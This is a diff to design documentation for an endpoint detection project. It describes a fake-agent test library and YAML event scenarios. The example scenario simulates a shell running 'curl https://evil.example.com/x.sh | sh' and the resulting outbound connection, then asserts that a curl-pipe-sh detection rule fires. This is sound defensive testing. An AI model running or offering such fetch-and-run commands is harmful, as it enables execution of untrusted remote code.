@@ -132,12 +132,14 @@ and headless binary are the shared substrate.
 
 The same library serves multiple consumers, so the wire contract is exercised end to end at every layer that uses it:
 
-- `test/fakeagent/`: Go library. Loads YAML scenarios, feeds events into a `Receiver` (in-process) or posts envelopes
-  directly to a server URL.
+- `test/fakeagent/`: Go library (UAT plan **M3**). Loads YAML scenarios, emits wire-format envelopes with deterministic
+  timestamps, and feeds them either through the headless binary's `POST /event` control plane (`FeedControlPlane`) or
+  directly to a server's ingest endpoint with a bearer token (`PostDirect`). Functional options cover start time, host
+  id override, playback speed multiplier, and `PostDirect` batch size.
 - `agent/cmd/fleet-edr-agent-headless`: production agent built with the stub receiver, plus an opt-in unix-socket control
   plane for tests. Doubles as the load generator.
-- `test/fakeagent/scenarios/`: YAML files describing event timelines, host metadata, and (where applicable) detection
-  assertions.
+- `test/fakeagent/scenarios/`: starter YAML scenarios shipped with M3 (`quiet-host`, `exec-fork-exit`,
+  `dns-and-network`). The M10 efficacy corpus and the L3 integration job add their own scenarios under separate paths.
 
 A scenario file looks like:
 
@@ -149,12 +151,17 @@ host:
   hostname: lab-mac.local
   os: macOS 14.4
 timeline:
-  - {at: 0ms,   type: fork, pid: 4001, ppid: 1}
-  - {at: 5ms,   type: exec, pid: 4001, path: /bin/zsh, args: ["zsh", "-c", "curl https://evil.example.com/x.sh | sh"]}
-  - {at: 10ms,  type: fork, pid: 4002, ppid: 4001}
-  - {at: 12ms,  type: exec, pid: 4002, path: /usr/bin/curl, args: ["curl", "https://evil.example.com/x.sh"]}
-  - {at: 50ms,  type: network_connect, pid: 4002, remote_ip: 203.0.113.7, remote_port: 443}
-  - {at: 200ms, type: exit, pid: 4002, code: 0}
+  - {at: 0ms,   type: fork, child_pid: 4001, parent_pid: 1}
+  - {at: 5ms,   type: exec, pid: 4001, ppid: 1, path: /bin/zsh,
+       args: ["zsh", "-c", "curl https://evil.example.com/x.sh | sh"],
+       cwd: /tmp, uid: 501, gid: 20}
+  - {at: 10ms,  type: fork, child_pid: 4002, parent_pid: 4001}
+  - {at: 12ms,  type: exec, pid: 4002, ppid: 4001, path: /usr/bin/curl,
+       args: ["curl", "https://evil.example.com/x.sh"],
+       cwd: /tmp, uid: 501, gid: 20}
+  - {at: 50ms,  type: network_connect, pid: 4002, protocol: tcp, direction: outbound,
+       remote_address: 203.0.113.7, remote_port: 443}
+  - {at: 200ms, type: exit, pid: 4002, exit_code: 0}
 assertions:
   - within: 5s
     rule: suspicious-curl-pipe-sh
